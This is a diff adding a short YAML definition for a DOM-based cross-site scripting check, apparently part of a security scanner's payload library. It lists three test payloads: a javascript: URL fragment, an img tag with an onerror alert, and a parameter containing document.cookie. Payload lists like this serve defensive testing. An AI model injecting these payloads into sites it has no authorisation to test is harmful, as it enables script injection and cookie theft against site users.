@@ -1,0 +1,7 @@
+name: "DOM-Based XSS"
+type: "dom_xss"
+severity: "high"
+payloads:
+  - "#javascript:alert(1)"
+  - "?param=<img src=x onerror=alert(1)>"
+  - "?param=document.cookie"
